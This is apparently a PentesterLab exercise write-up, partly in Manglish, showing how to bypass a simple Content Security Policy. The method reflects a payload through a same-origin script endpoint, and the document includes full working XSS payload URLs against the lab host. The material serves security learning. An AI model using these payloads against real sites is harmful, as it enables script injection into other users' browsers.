## Introduction
-->This exercise details the exploitation of a XSS in a simple web application that uses Content Security Policy
-->It was inspired by the following report on Hackerone: [https://hackerone.com/reports/153666](https://hackerone.com/reports/153666)

## Content Security Policy
-->Content Security Policy (CSP) is a way to limit the impact of a Cross-Site Scripting (amongst other things).
-->The CSP policy can be set via an HTTP header in the response or via a meta tag. Here a header is used.

## Detection of the vulnerability
-->The XSS in this page is trivial to find. However, if you use a classic payload:
```html
<script>alert(1)</script>
```
-->You will see a message in the console of your browser:
```
	Refused to execute inline script because it violates the following Content Security Policy directive: 
	"script-src 'self' https://pentesterlab.com". Either the 'unsafe-inline' keyword, a hash 
	('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable 
	inline execution.
```

## Bypassing CSP
-->You can quickly get access to the CSP policy by using curl (or a proxy):
```http
	$  curl http:/server/?name=hacker -o /dev/null --dump-header - 
	 
	HTTP/1.1 200 OK
	Server: nginx/1.6.2
	Date: Thu, 23 Aug 2018 08:04:47 GMT
	Content-Type: text/html; charset=UTF-8
	Content-Length: 1224
	Connection: keep-alive
	X-Powered-By: PHP/5.6.29-0+deb8u1
	X-XSS-Protection: 0
	Content-Security-Policy: default-src 'self'; script-src 'self' https://pentesterlab.com
	Vary: Accept-Encoding
```
-->The current policy limits the src of scripts to the server itself, via `'self'` and to `https://pentesterlab.com` (to provide analytics):
```bash
script-src 'self' https://pentesterlab.com
```
-->Since `unsafe-inline` is not enabled we cannot use a simple payload like `<script>[CODE]</script>`.
-->However, what we can do is try to find another vulnerable page on the server and use it to get our payload in the website. Then we can load that vulnerable page using a `<script>` tag:
```javascript
?name=<script src="/vulnerable/page.php?parameter=PAYLOAD"></script>
```
-->Since the CSP policy allows us to load scripts hosted on the same server, this method will allow use to run arbitrary JavaScript and get an `alert` box.

## Conclusion
-->This exercise showed you a method of bypassing a simple CSP policy in order to run JavaScript.
-->It's a simple introduction, but it helps us establish some foundational understanding required for the following exercises on CSP.

# Video Explanation
-->lab open aakuka apol namal ee url il ethum ->http://ptl-ae59b5f6-80b47904.libcurl.so/?name=hacker
-->ivide ulla name paramter vulnerable aan. njan `<marquee>joseph michal</marquee>` itt test chythapol aavunund
-->but njan `<script>alert(9)</script>` itt test chythapol xss trigger ayila
-->html injection aakunund.but xss akunila.so ini page il nokiyal kanam `Demo countdown` enn kanikunu.ie, xss chythapol kanikunathan
-->so ath view-source il poi nokuka :
```html
<script src="http://ptl-ae59b5f6-80b47904.libcurl.so/js/countdown.php?end=2534926825"></script>
<div class="row">
  <div class="col-lg-12">
    <h1>Content Security Policy</h1>
     ......   
```
-->so namal ee script il kanikuna src il pokuka ->http://ptl-ae59b5f6-80b47904.libcurl.so/js/countdown.php?end=2534926825  apol entho contents kanikum.so ee paramter il namuk test chyam. ivide =2534926825josuxxx enn koduth send chyumbol namuk ath page il reflect chyunath kanam.so avide namal xss test chyuka
-->ivide namal request ile resposne ile header il nokiyal kanam content security policy use chyunund :
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://pentesterlab.com
```
-->ithil ninum manasilakam athayath script src koduthal namuk javscript run chyikamen.so namal mate script ile src il ninum undakiya payload euthit src= yil aki send chyumbol namuk xss trigger chyunund ie,
->`http://ptl-ae59b5f6-80b47904.libcurl.so/?name=%3Cscript%20src=http://ptl-ae59b5f6-80b47904.libcurl.so/js/countdown.php?end=2534926825);alert(0);//%3E%3C/script%3E`
-->ivide `<script src=content security policyi yile script il ninum undakiuya xss payload ivide kodukanam` enit namal `</script>` koduth send chyumbol namuk xss trigger chyunund ok
-->ivide main aayi nokendath enthenal CSP aan. csp page il js allow chyunila. but csp header il paranja pole chythal matharam js allow chyu.so athin anusarichan namal xss chythath ok 
http://ptl-ae59b5f6-80b47904.libcurl.so/?name=%3Cscript%20src=http://ptl-ae59b5f6-80b47904.libcurl.so/js/countdown.php?end=2534926825);alert('66d1486a-6571-4069-a67b-c4a70a99798d');//%3E%3C/script%3E